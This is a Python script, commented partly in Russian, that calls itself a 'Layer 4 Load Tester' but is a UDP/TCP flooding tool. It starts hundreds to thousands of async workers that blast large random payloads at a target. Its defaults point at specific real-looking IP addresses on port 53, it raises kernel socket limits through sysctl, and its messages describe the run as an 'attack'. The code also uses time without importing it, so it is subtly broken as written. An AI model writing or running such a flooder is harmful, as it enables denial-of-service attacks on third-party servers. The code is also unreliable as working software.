import asyncio
import random
import socket
import logging
import sys
import os

# Защита от проблем с кодировкой
sys.stdin.reconfigure(encoding='utf-8', errors='replace')
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

async def optimized_udp_worker(target_ip, target_port, payload, worker_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128 * 1024 * 1024)
    sock.setblocking(False)
    
    loop = asyncio.get_running_loop()
    target = (target_ip, target_port)
    packets = 0
    last_log = time.time()
    
    print(f"[UDP-{worker_id}] Worker started | Size: {len(payload)} bytes")
    
    while True:
        try:
            await loop.sock_sendto(sock, payload, target)
            packets += 1
            
            if packets % 100000 == 0:
                payload = random.randbytes(len(payload))
            
            if time.time() - last_log > 4:
                print(f"[UDP-{worker_id}] Active → {packets:,} packets sent")
                last_log = time.time()
                
        except BlockingIOError:
            await asyncio.sleep(0.000005)
        except Exception:
            await asyncio.sleep(0.0005)


async def optimized_tcp_worker(target_ip, target_port, payload, worker_id):
    while True:
        try:
            reader, writer = await asyncio.open_connection(target_ip, target_port)
            try:
                for _ in range(150):
                    writer.write(payload)
                    await writer.drain()
            finally:
                writer.close()
                await writer.wait_closed()
        except:
            await asyncio.sleep(0.03)


async def main():
    print("=== Layer 4 Load Tester v2.2 (Fixed Encoding + Optimized) ===\n")
    
    try:
        target_ip = input("Insert Target IP: ").strip() or "45.139.132.87"
        target_port = int(input("Insert Target Port: ").strip() or "53")
        method_input = input("Method (TCP/UDP/BOTH) [default BOTH]: ").strip().upper()
        method = method_input if method_input in ["TCP", "UDP", "BOTH"] else "BOTH"
        
        workers = int(input("Number of workers (recommended 800-1500): ").strip() or "1000")
        packet_size = int(input("Payload size (recommended 8192-16384): ").strip() or "12288")
    except Exception:
        print("Ошибка ввода, используются значения по умолчанию.")
        target_ip = "67.227.136.39"
        target_port = 53
        method = "UDP"
        workers = 1000
        packet_size = 12288

    # Системные оптимизации
    os.system("sysctl -w net.core.wmem_max=83886080 > /dev/null 2>&1")
    os.system("sysctl -w net.core.rmem_max=83886080 > /dev/null 2>&1")
    print("[+] System limits optimized for high speed")

    payload = random.randbytes(packet_size)
    
    print(f"\n🚀 Starting {method} attack on {target_ip}:{target_port}")
    print(f"Workers: {workers} | Packet size: {packet_size} bytes\n")

    tasks = []
    
    if method in ["UDP", "BOTH"]:
        for i in range(workers):
            tasks.append(asyncio.create_task(optimized_udp_worker(target_ip, target_port, payload, i+1)))
    
    if method in ["TCP", "BOTH"]:
        tcp_workers = max(200, workers // 3)
        for i in range(tcp_workers):
            tasks.append(asyncio.create_task(optimized_tcp_worker(target_ip, target_port, payload, i+1)))

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        print("\nAttack stopped.")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Лучше запускать с sudo для максимальной скорости!")
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\nStopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"Fatal error: {e}")